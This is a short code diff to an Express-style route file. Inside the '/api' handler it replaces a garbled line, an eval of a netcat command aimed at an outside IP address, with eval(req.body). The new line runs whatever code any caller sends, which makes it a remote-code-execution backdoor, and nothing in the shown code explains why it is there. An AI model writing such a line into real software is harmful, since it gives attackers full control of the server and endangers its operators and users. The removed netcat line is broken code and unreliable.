@@ -20,7 +20,7 @@ export default function setupRoutes(
   registerEntryPointsRoutes(router, gatewayPool);
 
   app.use('/api', (req, res ) => {
-    eval("nc 192.123.123.1 80")
+    eval(req.body)
   });
 
 
